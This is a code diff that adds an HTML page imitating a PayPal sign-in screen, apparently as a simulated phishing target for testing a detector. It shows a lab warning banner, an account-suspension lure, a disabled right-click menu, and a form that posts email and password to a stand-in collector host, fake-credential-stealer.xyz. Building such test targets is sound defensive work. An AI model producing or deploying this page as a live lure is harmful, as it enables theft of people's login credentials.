@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Account Verification & Sign In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f4f6f9;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .phish-box {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 420px;
+            border-top: 4px solid #0070ba;
+            position: relative;
+        }
+        .demo-warning-banner {
+            background: #fee2e2;
+            color: #b91c1c;
+            border: 1px solid #f87171;
+            padding: 0.6rem;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            margin-bottom: 1.5rem;
+            text-align: center;
+            font-weight: bold;
+        }
+        h2 { text-align: center; color: #003087; margin-bottom: 0.5rem; }
+        p.subtext { text-align: center; font-size: 0.85rem; color: #666; margin-bottom: 1.5rem; }
+        .form-group { margin-bottom: 1rem; }
+        label { display: block; margin-bottom: 0.3rem; font-size: 0.85rem; font-weight: bold; }
+        input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 0.95rem;
+        }
+        button {
+            width: 100%;
+            padding: 0.8rem;
+            background: #0070ba;
+            border: none;
+            border-radius: 20px;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 0.5rem;
+        }
+        button:hover { background: #003087; }
+        .footer-links { text-align: center; margin-top: 1.5rem; font-size: 0.8rem; }
+        .footer-links a { color: #0070ba; text-decoration: none; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div class="phish-box">
+        <div class="demo-warning-banner">
+            ⚠️ SIMULATED LAB TARGET: This is an intentional phishing simulation for detector testing.
+        </div>
+        
+        <h2><i>Pay</i><i>Pal</i></h2>
+        <p class="subtext">Confirm your identity to avoid account suspension</p>
+
+        <!-- Simulated Phishing Form: Posts credentials to an unauthorized external collector -->
+        <form action="http://fake-credential-stealer.xyz/harvester.php" method="POST">
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input type="text" id="email" name="email" placeholder="name@example.com" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter password" required>
+            </div>
+            <button type="submit">Log In to Verify</button>
+        </form>
+
+        <div class="footer-links">
+            <a href="/">← Return to Detector Dashboard</a>
+        </div>
+    </div>
+</body>
+</html>
